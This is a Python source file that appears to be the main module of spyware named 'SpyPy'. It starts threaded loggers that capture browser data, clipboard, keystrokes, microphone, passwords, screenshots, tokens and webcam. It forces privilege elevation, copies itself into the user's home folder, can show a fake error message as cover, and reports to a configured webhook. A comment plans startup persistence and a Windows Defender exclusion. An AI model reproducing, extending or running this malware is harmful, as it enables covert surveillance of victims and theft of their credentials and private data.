import tempfile
import os
import threading
import shutil
import sys
import subprocess

from utils import *
from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.password_logger import PasswordLogger
from loggers.screen_logger import ScreenLogger
from loggers.token_logger import TokenLogger
from loggers.webcam_logger import WebcamLogger 

######################################################
# These variables will be configured by the builder. #
# Please do not modify them to avoid any issues.     #
WEBHOOK_URL = ""                                     #
SOFTWARE_EXE_NAME = ""                               #
SOFTWARE_DIR_NAME = ""                               #
CUSTOM_ERROR_MESSAGE = None                          #
######################################################



class SpyPy:
    def __init__(self):
        if not is_admin():
            try:
                if get_platform() == "Windows":
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
                else:
                    os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
            except Exception as e:
                display_error_message("Error", f"Failed to elevate privileges: {e}")
                os._exit(1)
                
        self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
        self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
        '''
        # remove these for now until testing is done
        if not os.path.exists(self.software_dir):
            os.makedirs(self.software_dir)
        if not os.path.exists(self.logs_path):
            os.makedirs(self.logs_path)
            '''        
        self.is_exe = is_exe()
        self.is_first_run = self.is_exe and not os.path.abspath(__file__).startswith(self.software_dir)
        
        self.setup()

        self.loggers = []
        logger_names = ["BrowserLogger", "ClipboardLogger", "InputLogger", "MicrophoneLogger", "PasswordLogger", "ScreenLogger", "TokenLogger", "WebcamLogger"]
        for logger_name in logger_names:
            if not globals().get(logger_name):
                continue
            self.loggers.append(globals().get(logger_name)())
            # awesome sauce
        self.threads = []

    def start(self):
        for logger in self.loggers:
            if not logger:
                continue
            thread = threading.Thread(target=logger.start, name=type(logger).__name__) 
            thread.start()
            self.threads.append(thread)
    
    def stop(self):
        os._exit(0) # Force exit the program bc threads take so long to close 

    def setup(self):
        if self.is_first_run and not is_exe():
            current_exe = sys.executable
            new_exe = os.path.join(self.software_dir, SOFTWARE_EXE_NAME)
            shutil.copyfile(current_exe, new_exe)
            subprocess.Popen([new_exe])
            # TODO add the new exe to startup and make an exception for the new exe in windows defender :D
            if CUSTOM_ERROR_MESSAGE:
                display_error_message(f"A fatal error occured while running {SOFTWARE_EXE_NAME}:", CUSTOM_ERROR_MESSAGE)
            os._exit(0)
        else:
            send_webhook(WEBHOOK_URL, f"```SpyPy has been executed on {get_platform()}```")
if __name__ == "__main__":
    SpyPy().start()